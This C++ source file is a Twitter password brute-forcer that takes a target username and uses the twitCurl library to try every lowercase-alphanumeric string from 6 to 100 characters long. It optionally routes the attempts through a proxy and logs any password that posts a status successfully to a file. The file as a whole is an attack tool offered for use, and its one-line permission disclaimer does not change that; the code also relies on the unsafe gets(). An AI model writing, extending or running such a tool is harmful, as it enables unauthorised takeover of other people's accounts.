#include <iostream>
#include <fstream>
#include "twitcurl.h"

#define NUMBEROFCHARS 36 // Defines how many chars are in the char array below

std::ofstream output;

char chars[]={'0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'};

    twitCurl twitterObj;
    std::string tmpStr( "" );
    std::string replyMsg( "" );
    std::string baseString = "";

     void checkPassword(std::string password) {
     
     twitterObj.setTwitterPassword( password );
  
          if( twitterObj.statusUpdate( tmpStr ) )
    {
        twitterObj.getLastWebResponse( replyMsg );
        printf( "\ntwitterClient:: twitCurl::updateStatus web response:\n%s\n", replyMsg.c_str() );
        std::cout << "\nPassword used was: " << password;
        output << "\nWeb Response: \n" << replyMsg.c_str() << "\n";
        output << "Password used was: " << password << "\n";
        //while(true){}
    } 
}

      void recurse(int width, int position, std::string baseString) {
  
      for(int i=0;i<NUMBEROFCHARS;i++) {
  
      if (position < width-1) {
  
      recurse(width, position + 1, baseString+chars[i]);
  
      }
  
      checkPassword(baseString+chars[i]);
  
      }
  
      }

int main()
{
    output.open("LOG.txt");

    /* Set twitter username and password */
    char userName[1024];
    //char passWord[1024];
    memset( userName, 0, 1024 );
    //memset( passWord, 0, 1024 );
    
    printf( "\nTwitter Sequential Acsending Bruteforcer by Arikado" );
    printf( "\nhttp://arikadosblog.blogspot.com" );
    printf( "\nhttp://twitter.com/OArikadoO" );
    
    printf ("\n\nDo NOT use this program to get any passwords you do not have permission to get.");

    printf( "\n\nEnter twitter username to password bruteforce: " );
    gets( userName );

    tmpStr = userName;
    twitterObj.setTwitterUsername( tmpStr );
    
    output << "Bruteforcing: " << tmpStr << std::endl;
    
    int StartSize = 0;
    printf( "\nEnter the minimum character size of the password (cannot be less then 6 or greater then 100): ");
    std::cin >> StartSize;
    
    if(StartSize < 6)
    StartSize = 6;
    if(StartSize > 100)
    StartSize = 100;

    /* Set proxy server usename, password, IP and port (if present) */
    char proxyPresent[1024];
    memset( proxyPresent, 0, 1024 );

    printf( "\nDo you have a proxy server configured (0 for no; 1 for yes): " );
    int isProxy = 0;
    std::cin >> isProxy;

    if( isProxy > 0 )
    {
        char proxyIp[1024];
        char proxyPort[1024];
        char proxyUsername[1024];
        char proxyPassword[1024];

        memset( proxyIp, 0, 1024 );
        memset( proxyPort, 0, 1024 );
        memset( proxyUsername, 0, 1024 );
        memset( proxyPassword, 0, 1024 );

        printf( "\nEnter proxy server IP: " );
        gets( proxyIp );
        gets( proxyIp );
        printf( "\nEnter proxy server port: " );
        gets( proxyPort );
        printf( "\nEnter proxy server username: " );
        gets( proxyUsername );
        printf( "\nEnter proxy server password: " );
        gets( proxyPassword );

        tmpStr = proxyIp;
        twitterObj.setProxyServerIp( tmpStr );
        tmpStr = proxyPort;
        twitterObj.setProxyServerPort( tmpStr );
        tmpStr = proxyUsername;
        twitterObj.setProxyUserName( tmpStr );
        tmpStr = proxyPassword;
        twitterObj.setProxyPassword( tmpStr );
    }

    /* Post a new status message */
    char statusMsg[1024];
    memset( statusMsg, 0, 1024 );

    printf( "\nEnter a new status message: " );
    if(isProxy <= 0)
    gets( statusMsg );
    gets( statusMsg );
    tmpStr = statusMsg;
    
      int maxChars = 100;
  
      for(int i=StartSize;i<maxChars+1;i++) {

      std::cout << "checking passwords width [" << i << "]..." << std::endl;
  
      recurse(i,0,"");
  
      }
 
    output.close();

    return 0;
}
